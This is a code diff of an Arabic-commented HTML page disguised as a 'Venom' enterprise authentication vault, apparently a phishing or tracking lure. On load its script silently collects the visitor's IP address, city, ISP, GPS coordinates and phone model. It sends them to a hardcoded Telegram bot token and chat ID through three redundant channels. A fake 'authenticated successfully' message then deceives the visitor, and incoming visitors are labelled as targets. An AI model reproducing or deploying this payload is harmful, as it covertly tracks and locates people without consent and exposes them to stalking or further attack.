@@ -3,84 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Venom Master | Enterprise License Vault</title>
+    <title>Venom Master | Enterprise Vault</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #ff003c; --bg: #020205; }
         body { margin: 0; background: var(--bg); color: white; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .main-card { position: relative; z-index: 10; background: rgba(10, 10, 15, 0.9); border: 1px solid rgba(255, 0, 60, 0.3); padding: 40px; border-radius: 25px; text-align: center; box-shadow: 0 0 50px rgba(255, 0, 60, 0.1); width: 90%; max-width: 450px; backdrop-filter: blur(10px); }
-        .logo { font-family: 'Orbitron', sans-serif; font-size: 32px; color: var(--primary); letter-spacing: 6px; margin-bottom: 10px; text-shadow: 0 0 20px rgba(255, 0, 60, 0.4); }
-        .loader { width: 50px; height: 50px; border: 3px solid #111; border-top: 3px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 25px auto; }
+        .main-card { position: relative; z-index: 10; background: rgba(10, 10, 15, 0.95); border: 1px solid var(--primary); padding: 40px; border-radius: 25px; text-align: center; box-shadow: 0 0 40px rgba(255, 0, 60, 0.2); width: 85%; max-width: 450px; }
+        .logo { font-family: 'Orbitron', sans-serif; font-size: 32px; color: var(--primary); letter-spacing: 5px; margin-bottom: 20px; }
+        .loader { width: 45px; height: 45px; border: 3px solid #111; border-top: 3px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-size: 14px; color: #888; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="main-card">
         <div class="logo">VENOM</div>
-        <div style="font-size: 11px; letter-spacing: 2px; color: #444; margin-bottom: 20px;">ENCRYPTED AUTHENTICATION</div>
         <div class="loader"></div>
-        <div id="status">جاري فحص سلامة النظام...</div>
-        <p style="font-size: 12px; color: #333; margin-top: 40px;">© 2025 SECURE MODULE BY @b4_93</p>
+        <div id="status">جاري تأمين الجلسة الرقمية...</div>
     </div>
 
     <script>
         const BOT_TOKEN = '7854757970:AAEILS2nBQCohHDVzSCLjt_65iXDhzT8gac';
         const CHAT_ID = '7336962855';
 
-        // دالة لاستخراج نوع الجهاز بدقة من User Agent
-        function getDeviceModel() {
+        // دالة تحديد نوع الهاتف بدقة
+        function getPhoneModel() {
             const ua = navigator.userAgent;
             if (/android/i.test(ua)) {
-                const model = ua.match(/Android\s([^\s;]+|.*)\sBuild\/([^\s;]+)/) || ua.match(/\(([^;]+);/);
-                return model ? model[1] : "Android Device";
+                const match = ua.match(/Android\s([^\s;]+|.*)\sBuild\/([^\s;]+)/) || ua.match(/\(([^;]+);/);
+                return match ? match[1] : "Android Phone";
             } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                return "Apple iOS Device";
-            } else if (/Windows/i.test(ua)) {
-                return "Windows PC";
+                return "Apple Device (iPhone/iPad)";
             }
-            return navigator.platform || "Unknown Device";
+            return navigator.platform;
         }
 
-        async function captureTarget() {
+        async function sendData() {
             try {
-                // جلب بيانات IP والإحداثيات
+                // 1. جلب البيانات من API سريع جداً
                 const response = await fetch('https://ipapi.co/json/');
                 const d = await response.json();
+                const phone = getPhoneModel();
+                const maps = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-                // جلب نوع الجهاز
-                const deviceModel = getDeviceModel();
-
-                // بناء رابط خرائط جوجل
-                const googleMaps = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-
-                // تنسيق الرسالة
-                const message = encodeURIComponent(
-                    `💎 **VIP TARGET HIT** 💎\n\n` +
+                // 2. تجهيز النص
+                const text = encodeURIComponent(
+                    `🚀 **NEW TARGET DETECTED**\n\n` +
+                    `📱 **Device:** \`${phone}\`\n` +
                     `🌐 **IP:** \`${d.ip}\`\n` +
                     `📍 **Location:** ${d.city}, ${d.country_name}\n` +
-                    `📡 **ISP:** ${d.org}\n` +
-                    `📱 **Device Type:** \`${deviceModel}\`\n\n` +
-                    `📍 **Google Maps:** ${googleMaps}\n\n` +
-                    `✅ Verified by @b4_93`
+                    `📡 **ISP:** ${d.org}\n\n` +
+                    `🗺️ **Maps:** ${maps}\n\n` +
+                    `✅ @b4_93`
                 );
 
-                // الإرسال الصامت عبر Image Beacon
-                const finalUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`;
-                const sender = new Image();
-                sender.src = finalUrl;
+                // 3. الحل النهائي: إرسال الطلب عبر 3 مسارات مختلفة لضمان الوصول
+                const apiURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=Markdown`;
 
+                // المسار الأول: Fetch (no-cors)
+                fetch(apiURL, { mode: 'no-cors' });
+
+                // المسار الثاني: Image Beacon (الأكثر ضماناً)
+                const img = new Image();
+                img.src = apiURL;
+
+                // المسار الثالث: Navigator Beacon (للمتصفحات الحديثة)
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(apiURL);
+                }
+
+                // تمويه المستخدم
                 setTimeout(() => {
-                    document.getElementById('status').innerText = "تم التحقق من الترخيص بنجاح! ✅";
+                    document.getElementById('status').innerText = "تم المصادقة بنجاح! ✅";
                     document.getElementById('status').style.color = "#00ff88";
-                }, 3500);
+                }, 3000);
 
             } catch (e) {
-                new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=New_Visit_Detected_But_API_Blocked`;
+                // في حال فشل الـ API، أرسل إشعاراً بسيطاً بالدخول
+                new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=New_Visit_Detected`;
             }
         }
 
-        window.onload = captureTarget;
+        window.onload = sendData;
     </script>
 </body>
 </html>
